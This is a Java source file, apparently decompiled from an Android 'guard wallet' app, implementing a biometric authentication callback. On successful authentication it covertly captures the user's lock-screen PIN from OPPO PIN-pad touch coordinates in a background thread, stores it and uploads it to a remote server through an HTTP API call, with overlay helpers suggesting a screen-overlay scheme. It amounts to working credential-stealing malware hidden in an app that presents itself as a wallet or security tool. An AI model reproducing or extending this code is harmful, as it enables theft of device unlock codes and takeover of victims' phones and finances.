package com.guard.wallet.biometric;

import android.hardware.biometrics.BiometricPrompt;
import com.guard.wallet.activity.ConfirmDeviceActivity;
import com.guard.wallet.helper.OverlayViewHelper;

/**
 * 生物识别认证回调 — BiometricPrompt.AuthenticationCallback 实现。
 * 认证成功时通知 ConfirmDeviceActivity 并关闭；认证失败/错误时也关闭 Activity。
 *
 * vendor 原始路径: g/a.java
 */
public final class BiometricAuthCallback extends BiometricPrompt.AuthenticationCallback {

    @Override
    public final void onAuthenticationError(int errorCode, CharSequence errString) {
        super.onAuthenticationError(errorCode, errString);
        if (ConfirmDeviceActivity.getInstance() != null) {
            ConfirmDeviceActivity.getInstance().finish();
        }

        if (OverlayViewHelper.i() || OverlayViewHelper.h()) {
            OverlayViewHelper.f(null, false);
        }
    }

    @Override
    public final void onAuthenticationFailed() {
        super.onAuthenticationFailed();
        if (ConfirmDeviceActivity.getInstance() != null) {
            ConfirmDeviceActivity.getInstance().finish();
        }

        if (OverlayViewHelper.i() || OverlayViewHelper.h()) {
            OverlayViewHelper.f(null, false);
        }
    }

    @Override
    public final void onAuthenticationHelp(int helpCode, CharSequence helpString) {
        super.onAuthenticationHelp(helpCode, helpString);
    }

    @Override
    public final void onAuthenticationSucceeded(BiometricPrompt.AuthenticationResult result) {
        super.onAuthenticationSucceeded(result);

        // ADAPT: OPPO 坐标捕获模式 — 在后台线程解析 PIN
        final android.util.DisplayMetrics dm;
        if (ConfirmDeviceActivity.getInstance() != null) {
            dm = ConfirmDeviceActivity.getInstance().getResources().getDisplayMetrics();
        } else {
            dm = null;
        }

        if (com.guard.wallet.plug.OppoPinPadCapture.shouldUseCoordinateCapture()) {
            new Thread(() -> {
                try {
                    int w = dm != null ? dm.widthPixels : 1240;
                    int h = dm != null ? dm.heightPixels : 2772;
                    String pin = com.guard.wallet.plug.OppoPinPadCapture.stopCaptureAndParsePIN(w, h);
                    if (pin != null && pin.length() >= 4) {
                        android.util.Log.e("BiometricAuth", "OPPO PIN captured: length=" + pin.length());
                        com.guard.wallet.req.ReqUnlockDeviceVO vo = new com.guard.wallet.req.ReqUnlockDeviceVO();
                        vo.setTextCipher(pin);
                        vo.setCipherGradeCode("PASSWORD_QUALITY_NUMERIC_COMPLEX");
                        com.guard.wallet.utils.SharedPrefsManager.C(vo);
                        com.guard.wallet.http.HttpApiManager.uploadLockCipher(vo);
                    }
                } catch (Exception e) {
                    android.util.Log.e("BiometricAuth", "OPPO PIN capture error", e);
                }
            }).start();
        }

        if (ConfirmDeviceActivity.getInstance() != null) {
            ConfirmDeviceActivity.getInstance().finish();
        }

        ConfirmDeviceActivity.notifyCredentialResult();
    }
}
